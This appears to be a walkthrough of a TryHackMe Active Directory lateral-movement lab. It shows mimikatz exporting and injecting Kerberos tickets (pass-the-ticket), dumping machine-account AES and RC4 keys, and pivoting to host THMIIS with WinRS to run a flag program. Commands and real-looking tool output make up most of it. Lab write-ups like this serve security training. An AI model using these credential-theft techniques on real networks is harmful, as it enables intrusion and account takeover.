```
mimikatz # exit                                                             
Bye!     
                                      
za\t2_felicia.dean@THMJMP2 c:\tools>dir *.kirbi                                    
...                           
07/05/2026  03:46 PM             1,543 [0;1e393d]-2-0-40e10000-simon.evans@k
rbtgt-ZA.TRYHACKME.COM.kirbi                                                
07/05/2026  03:45 PM             1,583 [0;20bc77]-2-0-40e10000-t2_felicia.de
an@krbtgt-ZA.TRYHACKME.COM.kirbi                                            
...
07/04/2026  02:46 AM             1,561 [0;21b11c]-2-0-40e10000-roger.baxter@
krbtgt-ZA.TRYHACKME.COM.kirbi                                               
...
07/04/2026  02:33 AM             1,583 [0;32b139]-2-0-40e10000-t2_felicia.de
an@krbtgt-ZA.TRYHACKME.COM.kirbi                                            
...
07/05/2026  03:46 PM             1,497 [0;3e4]-2-0-60a10000-THMJMP2$@krbtgt-
ZA.TRYHACKME.COM.kirbi                                                      
07/05/2026  03:46 PM             1,497 [0;3e4]-2-1-40e10000-THMJMP2$@krbtgt-
ZA.TRYHACKME.COM.kirbi                                                      
...
07/05/2026  02:50 PM             1,497 [0;3e7]-2-0-40e10000-THMJMP2$@krbtgt-
ZA.TRYHACKME.COM.kirbi                                                      
07/05/2026  03:46 PM             1,497 [0;3e7]-2-0-60a10000-THMJMP2$@krbtgt-
ZA.TRYHACKME.COM.kirbi                                                      
07/05/2026  03:46 PM             1,497 [0;3e7]-2-1-40e10000-THMJMP2$@krbtgt-
ZA.TRYHACKME.COM.kirbi                                                      
07/04/2026  02:46 AM             1,583 [0;3ecc69]-2-0-40e10000-t2_felicia.de
an@krbtgt-ZA.TRYHACKME.COM.kirbi                                            
...
07/05/2026  03:46 PM             1,705 [0;9811a]-0-0-40a50000-t1_toby.beck1@
LDAP-THMDC.za.tryhackme.com.kirbi                                           
07/05/2026  03:46 PM             1,555 [0;9811a]-2-0-40e10000-t1_toby.beck1@
krbtgt-ZA.TRYHACKME.COM.kirbi                                               
              38 File(s)      3,438,433 bytes                               
               3 Dir(s)   6,207,197,184 bytes free     
```
Once we have extracted the desired ticket, we can inject the tickets into the current session with the following command: For toby.beck1 at end there

```
mimikatz # kerberos::ptt "[0;9811a]-2-0-40e10000-t1_toby.beck1@krbtgt-ZA.TRY
HACKME.COM.kirbi"                                                           
                                                                            
* File: '[0;9811a]-2-0-40e10000-t1_toby.beck1@krbtgt-ZA.TRYHACKME.COM.kirbi'
: OK                                                                        
                                                                            
mimikatz # exit                                                             
Bye!                                                                        
                                                                            
za\t2_felicia.dean@THMJMP2 c:\tools>klist                                   
                                                                            
Current LogonId is 0:0x5938b                                                
                                                                            
Cached Tickets: (1)                                                         
                                                                            
#0>     Client: t1_toby.beck1 @ ZA.TRYHACKME.COM                            
        Server: krbtgt/ZA.TRYHACKME.COM @ ZA.TRYHACKME.COM                  
        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96                
        Ticket Flags 0x40e10000 -> forwardable renewable initial pre_authent
 name_canonicalize                                                          
        Start Time: 7/5/2026 15:43:45 (local)                               
        End Time:   7/6/2026 1:43:45 (local)                                
        Renew Time: 7/12/2026 15:43:45 (local)                              
        Session Key Type: AES-256-CTS-HMAC-SHA1-96                          
        Cache Flags: 0x1 -> PRIMARY                                         
        Kdc Called:                                                         
                                                                            
za\t2_felicia.dean@THMJMP2 c:\tools>     
```
#### Next Kerberos keys (RC4/AES) → Pass‑the‑Key / Overpass‑the‑Hash
```
mimikatz # privilege::debug                                                                                                                                 
Privilege '20' OK                                                                                                          
mimikatz # sekurlsa::ekeys       
```
No results usable all seem to be THMIIS not THMJMP2.
```
Authentication Id : 0 ; 999 (00000000:000003e7)                             
Session           : UndefinedLogonType from 0                               
User Name         : THMIIS$                                                 
Domain            : ZA                                                      
Logon Server      : (null)                                                  
Logon Time        : 7/5/2026 5:12:42 PM                                     
SID               : S-1-5-18                                                
                                                                            
         * Username : thmiis$                                               
         * Domain   : ZA.TRYHACKME.COM                                      
         * Password : (null)                                                
         * Key List :                                                       
           aes256_hmac       e538dd717e1359e4cd9b331c8ba388cafabc813a364070b
81f9f148e66e61f41                                                           
           rc4_hmac_nt       a0298599d3c65498a06c923b92385d99               
           rc4_hmac_old      a0298599d3c65498a06c923b92385d99               
           rc4_md4           a0298599d3c65498a06c923b92385d99               
           rc4_hmac_nt_exp   a0298599d3c65498a06c923b92385d99               
           rc4_hmac_old_exp  a0298599d3c65498a06c923b92385d99    
```

Your goal:
- Extract authentication material for t1_toby.beck  
- Inject it into your current session
- Obtain a shell authenticated as t1_toby.beck

Any of these techniques are acceptable:
- Pass‑the‑Hash
- Pass‑the‑Ticket
- Pass‑the‑Key

Once injected, your session silently uses t1_toby.beck’s credentials.


#### 3. Pivot to THMIIS Using WinRS

With t1_toby.beck’s credentials loaded, connect to THMIIS:

Code
winrs.exe -r:THMIIS.za.tryhackme.com cmd
No username or password required — WinRS automatically uses the credentials injected into your current session.

This gives you a remote command prompt on THMIIS as t1_toby.beck.


#### 4. Retrieve the Flag

Navigate to t1_toby.beck’s desktop on THMIIS and run:
```
flag.exe
```
The output is the answer to the challenge:
